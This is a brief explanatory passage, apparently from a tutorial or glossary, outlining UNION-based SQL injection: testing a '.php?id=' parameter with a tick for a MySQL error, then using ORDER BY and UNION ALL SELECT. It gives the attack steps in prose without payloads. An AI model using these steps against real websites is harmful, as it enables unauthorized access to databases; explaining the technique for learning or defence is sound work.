In UNION SQL injection, an attacker uses the UNION clause to concatenate a malicious query with the original query to retrieve results from the target database table. 

An attacker checks for this vulnerability by adding a tick at the end of a ".php? id=" file. 

If it comes back with a MySQL error, the site is most likely vulnerable to UNION SQL injection.

The attacker then proceeds to use ORDER BY to find the columns and finally uses the UNION ALL SELECT command
